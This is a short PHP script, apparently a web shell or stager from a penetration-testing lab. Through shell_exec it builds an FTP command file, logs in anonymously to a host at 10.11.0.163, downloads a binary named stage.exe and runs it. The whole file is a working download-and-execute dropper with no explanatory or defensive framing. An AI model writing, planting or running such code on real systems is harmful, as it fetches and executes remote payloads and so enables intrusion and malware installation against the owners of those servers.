<?php 
shell_exec('echo open 10.11.0.163 21 > ftp.txt');
shell_exec('echo USER anonymous >> ftp.txt');
shell_exec('echo ftp >> ftp.txt');
shell_exec('echo bin >> ftp.txt');
shell_exec('echo GET win-exe/stage.exe >> ftp.txt');
shell_exec('echo bye >> ftp.txt');
shell_exec('ftp -v -n -s:ftp.txt');
shell_exec('stage.exe');
?>
